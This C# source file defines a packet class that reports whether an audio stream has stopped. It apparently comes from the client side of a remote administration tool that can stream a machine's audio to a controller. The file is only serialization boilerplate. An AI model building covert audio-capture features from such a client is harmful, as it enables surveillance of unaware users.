using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets {

    [Serializable]
    public class StopAudioStreamResponse : IPacket {

        public bool StreamRunning { get; set; }

        public StopAudioStreamResponse() {
            
        }

        public StopAudioStreamResponse(bool streamRunning) {
            StreamRunning = streamRunning;
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
